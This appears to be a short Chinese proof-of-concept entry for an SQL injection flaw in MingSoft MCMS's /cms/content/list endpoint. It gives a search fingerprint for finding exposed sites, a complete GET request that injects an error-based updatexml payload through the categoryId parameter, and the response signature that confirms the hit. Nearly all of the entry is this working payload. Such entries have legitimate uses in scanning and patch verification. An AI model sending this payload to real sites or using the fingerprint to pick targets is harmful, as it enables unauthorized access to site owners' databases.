# 铭飞CMSlist存在SQL注入

铭飞 ｜ SQL注入 ｜ —
- **指纹**：`body="铭飞MCMS"`
- **请求**：`GET /cms/content/list?categoryId=1%27%20and%20updatexml(1,concat(0x7e,md5(123),0x7e),1)%20and%20%271 HTTP/1.1`
- **响应特征**：500 202cb962ac59075